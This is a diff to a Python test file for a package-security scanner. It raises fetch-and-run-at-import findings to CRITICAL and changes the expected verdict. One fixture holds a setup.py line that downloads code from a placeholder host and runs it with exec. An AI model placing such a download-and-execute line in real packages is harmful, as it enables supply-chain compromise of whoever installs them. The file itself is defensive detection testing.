@@ -59,9 +59,10 @@ class ReceivedCodeVerdictTests(unittest.TestCase):
     def test_the_trapdoor_replica_in_a_wheel(self):
         res = scan_wheel({**WHEEL_META, "trapdoor_py/__init__.py": TRAPDOOR_PY})
         (hit,) = issues(res, "SC-IMPORT-RISK")
-        self.assertEqual((hit["file"], hit["sev"], hit["line"]), ("trapdoor_py/__init__.py", "MAJOR", 3))
+        # fetch-and-run at import is CRITICAL since 0.1.7 (audit P0): no library needs it
+        self.assertEqual((hit["file"], hit["sev"], hit["line"]), ("trapdoor_py/__init__.py", "CRITICAL", 3))
         self.assertIn(REASON, hit["msg"])
-        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
+        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
 
     def test_in_setup_py_it_is_critical(self):
         res = scan_sdist({"setup.py": ("import requests\nexec(requests.get('https://files.invalid/p.py').text)\n"
